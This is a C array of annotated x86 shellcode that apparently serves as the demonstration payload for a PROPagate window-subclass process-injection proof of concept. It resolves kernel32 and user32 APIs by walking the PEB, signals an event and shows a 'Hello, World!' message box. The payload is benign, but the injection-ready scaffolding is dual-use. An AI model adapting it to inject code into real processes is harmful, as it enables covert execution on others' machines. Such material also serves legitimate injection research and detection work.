
#define PAYLOAD_SIZE 812

char PAYLOAD[] = {
  /* 0000 */ "\x81\xec\xb0\x00\x00\x00"                     /* sub esp, 0xb0                    */
  /* 0006 */ "\x53"                                         /* push ebx                         */
  /* 0007 */ "\x55"                                         /* push ebp                         */
  /* 0008 */ "\x33\xdb"                                     /* xor ebx, ebx                     */
  /* 000A */ "\xc7\x44\x24\x70\x47\x65\x74\x50"             /* mov dword [esp+0x70], 0x50746547 */
  /* 0012 */ "\x83\xbc\x24\xc0\x00\x00\x00\x10"             /* cmp dword [esp+0xc0], 0x10       */
  /* 001A */ "\xba\x65\x48\x61\x6e"                         /* mov edx, 0x6e614865              */
  /* 001F */ "\x6a\x65"                                     /* push 0x65                        */
  /* 0021 */ "\xb9\x61\x67\x61\x74"                         /* mov ecx, 0x74616761              */
  /* 0026 */ "\xc7\x44\x24\x78\x72\x6f\x63\x41"             /* mov dword [esp+0x78], 0x41636f72 */
  /* 002E */ "\x58"                                         /* pop eax                          */
  /* 002F */ "\xbd\x65\x6c\x33\x32"                         /* mov ebp, 0x32336c65              */
  /* 0034 */ "\xc7\x44\x24\x78\x64\x64\x72\x65"             /* mov dword [esp+0x78], 0x65726464 */
  /* 003C */ "\xc7\x44\x24\x7c\x73\x73\x00\x00"             /* mov dword [esp+0x7c], 0x7373     */
  /* 0044 */ "\xc7\x84\x24\x90\x00\x00\x00\x47\x65\x74\x4d" /* mov dword [esp+0x90], 0x4d746547 */
  /* 004F */ "\xc7\x84\x24\x94\x00\x00\x00\x6f\x64\x75\x6c" /* mov dword [esp+0x94], 0x6c75646f */
  /* 005A */ "\x89\x94\x24\x98\x00\x00\x00"                 /* mov [esp+0x98], edx              */
  /* 0061 */ "\xc7\x84\x24\x9c\x00\x00\x00\x64\x6c\x65\x41" /* mov dword [esp+0x9c], 0x41656c64 */
  /* 006C */ "\x89\x9c\x24\xa0\x00\x00\x00"                 /* mov [esp+0xa0], ebx              */
  /* 0073 */ "\xc7\x44\x24\x1c\x6b\x65\x72\x6e"             /* mov dword [esp+0x1c], 0x6e72656b */
  /* 007B */ "\x89\x6c\x24\x20"                             /* mov [esp+0x20], ebp              */
  /* 007F */ "\x89\x5c\x24\x24"                             /* mov [esp+0x24], ebx              */
  /* 0083 */ "\xc7\x44\x24\x14\x75\x73\x65\x72"             /* mov dword [esp+0x14], 0x72657375 */
  /* 008B */ "\xc7\x44\x24\x18\x33\x32\x00\x00"             /* mov dword [esp+0x18], 0x3233     */
  /* 0093 */ "\xc7\x44\x24\x4c\x4d\x65\x73\x73"             /* mov dword [esp+0x4c], 0x7373654d */
  /* 009B */ "\xc7\x44\x24\x50\x61\x67\x65\x42"             /* mov dword [esp+0x50], 0x42656761 */
  /* 00A3 */ "\xc7\x44\x24\x54\x6f\x78\x41\x00"             /* mov dword [esp+0x54], 0x41786f   */
  /* 00AB */ "\xc7\x84\x24\x80\x00\x00\x00\x48\x65\x6c\x6c" /* mov dword [esp+0x80], 0x6c6c6548 */
  /* 00B6 */ "\xc7\x84\x24\x84\x00\x00\x00\x6f\x2c\x20\x57" /* mov dword [esp+0x84], 0x57202c6f */
  /* 00C1 */ "\xc7\x84\x24\x88\x00\x00\x00\x6f\x72\x6c\x64" /* mov dword [esp+0x88], 0x646c726f */
  /* 00CC */ "\xc7\x84\x24\x8c\x00\x00\x00\x21\x00\x00\x00" /* mov dword [esp+0x8c], 0x21       */
  /* 00D7 */ "\xc7\x44\x24\x64\x50\x52\x4f\x50"             /* mov dword [esp+0x64], 0x504f5250 */
  /* 00DF */ "\x89\x4c\x24\x68"                             /* mov [esp+0x68], ecx              */
  /* 00E3 */ "\x89\x44\x24\x6c"                             /* mov [esp+0x6c], eax              */
  /* 00E7 */ "\xc7\x44\x24\x58\x70\x72\x6f\x70"             /* mov dword [esp+0x58], 0x706f7270 */
  /* 00EF */ "\x89\x4c\x24\x5c"                             /* mov [esp+0x5c], ecx              */
  /* 00F3 */ "\x89\x44\x24\x60"                             /* mov [esp+0x60], eax              */
  /* 00F7 */ "\xc7\x44\x24\x34\x53\x65\x74\x45"             /* mov dword [esp+0x34], 0x45746553 */
  /* 00FF */ "\xc7\x44\x24\x38\x76\x65\x6e\x74"             /* mov dword [esp+0x38], 0x746e6576 */
  /* 0107 */ "\x89\x5c\x24\x3c"                             /* mov [esp+0x3c], ebx              */
  /* 010B */ "\xc7\x44\x24\x28\x4f\x70\x65\x6e"             /* mov dword [esp+0x28], 0x6e65704f */
  /* 0113 */ "\xc7\x44\x24\x2c\x45\x76\x65\x6e"             /* mov dword [esp+0x2c], 0x6e657645 */
  /* 011B */ "\xc7\x44\x24\x30\x74\x41\x00\x00"             /* mov dword [esp+0x30], 0x4174     */
  /* 0123 */ "\xc7\x44\x24\x40\x43\x6c\x6f\x73"             /* mov dword [esp+0x40], 0x736f6c43 */
  /* 012B */ "\x89\x54\x24\x44"                             /* mov [esp+0x44], edx              */
  /* 012F */ "\xc7\x44\x24\x48\x64\x6c\x65\x00"             /* mov dword [esp+0x48], 0x656c64   */
  /* 0137 */ "\xc7\x84\x24\xa4\x00\x00\x00\x47\x65\x74\x46" /* mov dword [esp+0xa4], 0x46746547 */
  /* 0142 */ "\xc7\x84\x24\xa8\x00\x00\x00\x6f\x72\x65\x67" /* mov dword [esp+0xa8], 0x6765726f */
  /* 014D */ "\xc7\x84\x24\xac\x00\x00\x00\x72\x6f\x75\x6e" /* mov dword [esp+0xac], 0x6e756f72 */
  /* 0158 */ "\xc7\x84\x24\xb0\x00\x00\x00\x64\x57\x69\x6e" /* mov dword [esp+0xb0], 0x6e695764 */
  /* 0163 */ "\xc7\x84\x24\xb4\x00\x00\x00\x64\x6f\x77\x00" /* mov dword [esp+0xb4], 0x776f64   */
  /* 016E */ "\x0f\x85\x07\x01\x00\x00"                     /* jnz 0x27b                        */
  /* 0174 */ "\x64\xa1\x30\x00\x00\x00"                     /* mov eax, [fs:0x30]               */
  /* 017A */ "\x56"                                         /* push esi                         */
  /* 017B */ "\x57"                                         /* push edi                         */
  /* 017C */ "\x8b\x78\x08"                                 /* mov edi, [eax+0x8]               */
  /* 017F */ "\x8b\x47\x3c"                                 /* mov eax, [edi+0x3c]              */
  /* 0182 */ "\x8b\xb4\x38\x80\x00\x00\x00"                 /* mov esi, [eax+edi+0x80]          */
  /* 0189 */ "\x03\xf7"                                     /* add esi, edi                     */
  /* 018B */ "\x8b\x4e\x0c"                                 /* mov ecx, [esi+0xc]               */
  /* 018E */ "\x85\xc9"                                     /* test ecx, ecx                    */
  /* 0190 */ "\x74\x29"                                     /* jz 0x1bb                         */
  /* 0192 */ "\xba\x20\x20\x20\x20"                         /* mov edx, 0x20202020              */
  /* 0197 */ "\x8b\x04\x39"                                 /* mov eax, [ecx+edi]               */
  /* 019A */ "\x0b\xc2"                                     /* or eax, edx                      */
  /* 019C */ "\x3d\x6b\x65\x72\x6e"                         /* cmp eax, 0x6e72656b              */
  /* 01A1 */ "\x75\x0e"                                     /* jnz 0x1b1                        */
  /* 01A3 */ "\x8b\x44\x39\x04"                             /* mov eax, [ecx+edi+0x4]           */
  /* 01A7 */ "\x0b\xc2"                                     /* or eax, edx                      */
  /* 01A9 */ "\x3b\xc5"                                     /* cmp eax, ebp                     */
  /* 01AB */ "\x0f\x84\xd7\x00\x00\x00"                     /* jz 0x288                         */
  /* 01B1 */ "\x8b\x4e\x20"                                 /* mov ecx, [esi+0x20]              */
  /* 01B4 */ "\x83\xc6\x14"                                 /* add esi, 0x14                    */
  /* 01B7 */ "\x85\xc9"                                     /* test ecx, ecx                    */
  /* 01B9 */ "\x75\xdc"                                     /* jnz 0x197                        */
  /* 01BB */ "\x8b\x5c\x24\x10"                             /* mov ebx, [esp+0x10]              */
  /* 01BF */ "\x8b\x74\x24\x10"                             /* mov esi, [esp+0x10]              */
  /* 01C3 */ "\x85\xdb"                                     /* test ebx, ebx                    */
  /* 01C5 */ "\x0f\x84\xae\x00\x00\x00"                     /* jz 0x279                         */
  /* 01CB */ "\x85\xf6"                                     /* test esi, esi                    */
  /* 01CD */ "\x0f\x84\xa6\x00\x00\x00"                     /* jz 0x279                         */
  /* 01D3 */ "\x8d\x44\x24\x1c"                             /* lea eax, [esp+0x1c]              */
  /* 01D7 */ "\x50"                                         /* push eax                         */
  /* 01D8 */ "\xff\xd3"                                     /* call ebx                         */
  /* 01DA */ "\x8b\xe8"                                     /* mov ebp, eax                     */
  /* 01DC */ "\x8d\x44\x24\x24"                             /* lea eax, [esp+0x24]              */
  /* 01E0 */ "\x50"                                         /* push eax                         */
  /* 01E1 */ "\xff\xd3"                                     /* call ebx                         */
  /* 01E3 */ "\x8b\xf8"                                     /* mov edi, eax                     */
  /* 01E5 */ "\x85\xed"                                     /* test ebp, ebp                    */
  /* 01E7 */ "\x0f\x84\x8c\x00\x00\x00"                     /* jz 0x279                         */
  /* 01ED */ "\x85\xff"                                     /* test edi, edi                    */
  /* 01EF */ "\x0f\x84\x84\x00\x00\x00"                     /* jz 0x279                         */
  /* 01F5 */ "\x8d\x44\x24\x30"                             /* lea eax, [esp+0x30]              */
  /* 01F9 */ "\x50"                                         /* push eax                         */
  /* 01FA */ "\x57"                                         /* push edi                         */
  /* 01FB */ "\xff\xd6"                                     /* call esi                         */
  /* 01FD */ "\x89\x44\x24\x14"                             /* mov [esp+0x14], eax              */
  /* 0201 */ "\x8d\x44\x24\x3c"                             /* lea eax, [esp+0x3c]              */
  /* 0205 */ "\x50"                                         /* push eax                         */
  /* 0206 */ "\x57"                                         /* push edi                         */
  /* 0207 */ "\xff\xd6"                                     /* call esi                         */
  /* 0209 */ "\x8b\xd8"                                     /* mov ebx, eax                     */
  /* 020B */ "\x8d\x44\x24\x48"                             /* lea eax, [esp+0x48]              */
  /* 020F */ "\x50"                                         /* push eax                         */
  /* 0210 */ "\x57"                                         /* push edi                         */
  /* 0211 */ "\xff\xd6"                                     /* call esi                         */
  /* 0213 */ "\x8b\xf8"                                     /* mov edi, eax                     */
  /* 0215 */ "\x8d\x84\x24\xac\x00\x00\x00"                 /* lea eax, [esp+0xac]              */
  /* 021C */ "\x50"                                         /* push eax                         */
  /* 021D */ "\x55"                                         /* push ebp                         */
  /* 021E */ "\xff\xd6"                                     /* call esi                         */
  /* 0220 */ "\x89\x44\x24\x18"                             /* mov [esp+0x18], eax              */
  /* 0224 */ "\x8d\x44\x24\x54"                             /* lea eax, [esp+0x54]              */
  /* 0228 */ "\x50"                                         /* push eax                         */
  /* 0229 */ "\x55"                                         /* push ebp                         */
  /* 022A */ "\xff\xd6"                                     /* call esi                         */
  /* 022C */ "\x8b\x4c\x24\x14"                             /* mov ecx, [esp+0x14]              */
  /* 0230 */ "\x89\x44\x24\x10"                             /* mov [esp+0x10], eax              */
  /* 0234 */ "\x85\xc9"                                     /* test ecx, ecx                    */
  /* 0236 */ "\x74\x41"                                     /* jz 0x279                         */
  /* 0238 */ "\x85\xdb"                                     /* test ebx, ebx                    */
  /* 023A */ "\x74\x3d"                                     /* jz 0x279                         */
  /* 023C */ "\x85\xc0"                                     /* test eax, eax                    */
  /* 023E */ "\x74\x39"                                     /* jz 0x279                         */
  /* 0240 */ "\x8b\x6c\x24\x18"                             /* mov ebp, [esp+0x18]              */
  /* 0244 */ "\x85\xed"                                     /* test ebp, ebp                    */
  /* 0246 */ "\x74\x31"                                     /* jz 0x279                         */
  /* 0248 */ "\x85\xff"                                     /* test edi, edi                    */
  /* 024A */ "\x74\x2d"                                     /* jz 0x279                         */
  /* 024C */ "\x8d\x44\x24\x60"                             /* lea eax, [esp+0x60]              */
  /* 0250 */ "\x50"                                         /* push eax                         */
  /* 0251 */ "\x6a\x00"                                     /* push 0x0                         */
  /* 0253 */ "\x6a\x02"                                     /* push 0x2                         */
  /* 0255 */ "\xff\xd1"                                     /* call ecx                         */
  /* 0257 */ "\x8b\xf0"                                     /* mov esi, eax                     */
  /* 0259 */ "\x85\xf6"                                     /* test esi, esi                    */
  /* 025B */ "\x74\x1c"                                     /* jz 0x279                         */
  /* 025D */ "\x6a\x00"                                     /* push 0x0                         */
  /* 025F */ "\x8d\x44\x24\x70"                             /* lea eax, [esp+0x70]              */
  /* 0263 */ "\x50"                                         /* push eax                         */
  /* 0264 */ "\x8d\x84\x24\x90\x00\x00\x00"                 /* lea eax, [esp+0x90]              */
  /* 026B */ "\x50"                                         /* push eax                         */
  /* 026C */ "\xff\xd5"                                     /* call ebp                         */
  /* 026E */ "\x50"                                         /* push eax                         */
  /* 026F */ "\xff\x54\x24\x20"                             /* call dword [esp+0x20]            */
  /* 0273 */ "\x56"                                         /* push esi                         */
  /* 0274 */ "\xff\xd3"                                     /* call ebx                         */
  /* 0276 */ "\x56"                                         /* push esi                         */
  /* 0277 */ "\xff\xd7"                                     /* call edi                         */
  /* 0279 */ "\x5f"                                         /* pop edi                          */
  /* 027A */ "\x5e"                                         /* pop esi                          */
  /* 027B */ "\x5d"                                         /* pop ebp                          */
  /* 027C */ "\x33\xc0"                                     /* xor eax, eax                     */
  /* 027E */ "\x5b"                                         /* pop ebx                          */
  /* 027F */ "\x81\xc4\xb0\x00\x00\x00"                     /* add esp, 0xb0                    */
  /* 0285 */ "\xc2\x18\x00"                                 /* ret 0x18                         */
  /* 0288 */ "\x8d\x84\x24\x98\x00\x00\x00"                 /* lea eax, [esp+0x98]              */
  /* 028F */ "\x50"                                         /* push eax                         */
  /* 0290 */ "\x57"                                         /* push edi                         */
  /* 0291 */ "\x56"                                         /* push esi                         */
  /* 0292 */ "\xe8\x1b\x00\x00\x00"                         /* call 0x2b2                       */
  /* 0297 */ "\x8b\xd8"                                     /* mov ebx, eax                     */
  /* 0299 */ "\x8d\x84\x24\x84\x00\x00\x00"                 /* lea eax, [esp+0x84]              */
  /* 02A0 */ "\x50"                                         /* push eax                         */
  /* 02A1 */ "\x57"                                         /* push edi                         */
  /* 02A2 */ "\x56"                                         /* push esi                         */
  /* 02A3 */ "\xe8\x0a\x00\x00\x00"                         /* call 0x2b2                       */
  /* 02A8 */ "\x83\xc4\x18"                                 /* add esp, 0x18                    */
  /* 02AB */ "\x8b\xf0"                                     /* mov esi, eax                     */
  /* 02AD */ "\xe9\x11\xff\xff\xff"                         /* jmp 0x1c3                        */
  /* 02B2 */ "\x8b\x4c\x24\x04"                             /* mov ecx, [esp+0x4]               */
  /* 02B6 */ "\x53"                                         /* push ebx                         */
  /* 02B7 */ "\x55"                                         /* push ebp                         */
  /* 02B8 */ "\x8b\x6c\x24\x10"                             /* mov ebp, [esp+0x10]              */
  /* 02BC */ "\x8b\x19"                                     /* mov ebx, [ecx]                   */
  /* 02BE */ "\x03\xdd"                                     /* add ebx, ebp                     */
  /* 02C0 */ "\x56"                                         /* push esi                         */
  /* 02C1 */ "\x8b\x71\x10"                                 /* mov esi, [ecx+0x10]              */
  /* 02C4 */ "\x57"                                         /* push edi                         */
  /* 02C5 */ "\x8b\x03"                                     /* mov eax, [ebx]                   */
  /* 02C7 */ "\x33\xff"                                     /* xor edi, edi                     */
  /* 02C9 */ "\x03\xf5"                                     /* add esi, ebp                     */
  /* 02CB */ "\x85\xc0"                                     /* test eax, eax                    */
  /* 02CD */ "\x74\x29"                                     /* jz 0x2f8                         */
  /* 02CF */ "\x2b\xde"                                     /* sub ebx, esi                     */
  /* 02D1 */ "\x85\xc0"                                     /* test eax, eax                    */
  /* 02D3 */ "\x78\x15"                                     /* js 0x2ea                         */
  /* 02D5 */ "\x83\xc0\x02"                                 /* add eax, 0x2                     */
  /* 02D8 */ "\x03\xc5"                                     /* add eax, ebp                     */
  /* 02DA */ "\x50"                                         /* push eax                         */
  /* 02DB */ "\xff\x74\x24\x20"                             /* push dword [esp+0x20]            */
  /* 02DF */ "\xe8\x1b\x00\x00\x00"                         /* call 0x2ff                       */
  /* 02E4 */ "\x59"                                         /* pop ecx                          */
  /* 02E5 */ "\x59"                                         /* pop ecx                          */
  /* 02E6 */ "\x85\xc0"                                     /* test eax, eax                    */
  /* 02E8 */ "\x74\x0c"                                     /* jz 0x2f6                         */
  /* 02EA */ "\x83\xc6\x04"                                 /* add esi, 0x4                     */
  /* 02ED */ "\x8b\x04\x33"                                 /* mov eax, [ebx+esi]               */
  /* 02F0 */ "\x85\xc0"                                     /* test eax, eax                    */
  /* 02F2 */ "\x75\xdf"                                     /* jnz 0x2d3                        */
  /* 02F4 */ "\xeb\x02"                                     /* jmp 0x2f8                        */
  /* 02F6 */ "\x8b\x3e"                                     /* mov edi, [esi]                   */
  /* 02F8 */ "\x8b\xc7"                                     /* mov eax, edi                     */
  /* 02FA */ "\x5f"                                         /* pop edi                          */
  /* 02FB */ "\x5e"                                         /* pop esi                          */
  /* 02FC */ "\x5d"                                         /* pop ebp                          */
  /* 02FD */ "\x5b"                                         /* pop ebx                          */
  /* 02FE */ "\xc3"                                         /* ret                              */
  /* 02FF */ "\x8b\x44\x24\x08"                             /* mov eax, [esp+0x8]               */
  /* 0303 */ "\x56"                                         /* push esi                         */
  /* 0304 */ "\x8b\x74\x24\x08"                             /* mov esi, [esp+0x8]               */
  /* 0308 */ "\x8a\x16"                                     /* mov dl, [esi]                    */
  /* 030A */ "\x84\xd2"                                     /* test dl, dl                      */
  /* 030C */ "\x74\x14"                                     /* jz 0x322                         */
  /* 030E */ "\x8a\xca"                                     /* mov cl, dl                       */
  /* 0310 */ "\x2b\xf0"                                     /* sub esi, eax                     */
  /* 0312 */ "\x8a\xd1"                                     /* mov dl, cl                       */
  /* 0314 */ "\x3a\x08"                                     /* cmp cl, [eax]                    */
  /* 0316 */ "\x75\x0a"                                     /* jnz 0x322                        */
  /* 0318 */ "\x40"                                         /* inc eax                          */
  /* 0319 */ "\x8a\x0c\x06"                                 /* mov cl, [esi+eax]                */
  /* 031C */ "\x8a\xd1"                                     /* mov dl, cl                       */
  /* 031E */ "\x84\xc9"                                     /* test cl, cl                      */
  /* 0320 */ "\x75\xf0"                                     /* jnz 0x312                        */
  /* 0322 */ "\x0f\xb6\x08"                                 /* movzx ecx, byte [eax]            */
  /* 0325 */ "\x0f\xb6\xc2"                                 /* movzx eax, dl                    */
  /* 0328 */ "\x2b\xc1"                                     /* sub eax, ecx                     */
  /* 032A */ "\x5e"                                         /* pop esi                          */
  /* 032B */ "\xc3"                                         /* ret                              */
};